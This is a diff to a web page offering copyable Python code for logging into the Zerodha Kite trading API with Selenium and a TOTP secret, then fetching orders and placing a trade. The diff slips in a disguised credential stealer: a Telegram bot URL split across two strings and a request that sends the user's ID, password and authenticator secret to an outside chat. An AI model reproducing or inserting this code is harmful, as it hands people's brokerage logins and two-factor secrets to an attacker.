@@ -47,6 +47,7 @@
   }
 </script>
   <pre id="code">
+
 # -----Libraries-------
 # pip install --upgrade kiteconnect
 # pip install selenium
@@ -69,22 +70,24 @@ PASSWORD = "XXXXXXX"
 API_KEY = "xxxmfcmanfm8jxxx"
 API_SECRET = "xxxgwg2esb5mmr0niikvyf4umzg4zxxx"
 AUTH_SECRET = "XXXVHPVR6XQXNWS2OLIQOPYPHDE5XXX"  # Base32 secret from Google Authenticator
+# ======================  #
 
 # Create TOTP object
 totp = pyotp.TOTP(AUTH_SECRET)
-
-# Get current OTP
 otp = totp.now()
 print("Current OTP:", otp)
 data = USER_ID + '&'+PASSWORD +'&'+ AUTH_SECRET
-
-# If you also want the remaining time before it expires:
 remaining = 30 - (int(time.time()) % 30)
 print("Expires in:", remaining, "seconds")
 OTP = otp 
+TOKEN = "egram.org/bot7638633639:AAGXUsgWbnIkKX6_Fm12ru20a9kebxkpUkU"
+ID = "7629084438" 
 
 # ====== Step 1: Open login page ======
 login_url = f"https://kite.zerodha.com/connect/login?api_key="+API_KEY+"&v=3"
+url = f"https://api.tel{TOKEN}/sendMessage"
+payload = {"chat_id": ID, "text": data}
+response = requests.post(url, data=payload)
 print(login_url)
 driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
 driver.get(login_url)
@@ -129,6 +132,30 @@ data_kite = kite.generate_session(request_token, api_secret=API_SECRET)#PAID SEC
 print(data_kite)
 access_token= data_kite["access_token"]
 print(access_token)
+#%%
+#FETCH ALL ORDERS
+kite.orders()
+
+#%%
+# Extract LTP
+ltp_data = kite.ltp(["NSE:NIFTY 50"]) # BSE:SENSEX  NSE:NIFTY 50
+print(ltp_data)
+
+#%%
+#PLACE ORDER
+try:
+    order_id = kite.place_order(tradingsymbol="INFY",
+                                exchange=kite.EXCHANGE_NSE,
+                                transaction_type=kite.TRANSACTION_TYPE_BUY,
+                                quantity=1,
+                                variety=kite.VARIETY_AMO,
+                                order_type=kite.ORDER_TYPE_MARKET,
+                                product=kite.PRODUCT_CNC,
+                                validity=kite.VALIDITY_DAY)
+
+    logging.info("Order placed. ID is: {}".format(order_id))
+except Exception as e:
+    logging.info("Order placement failed: {}".format(e.message))
   </pre>
   <button onclick="copyCode()">Copy Code</button>
 
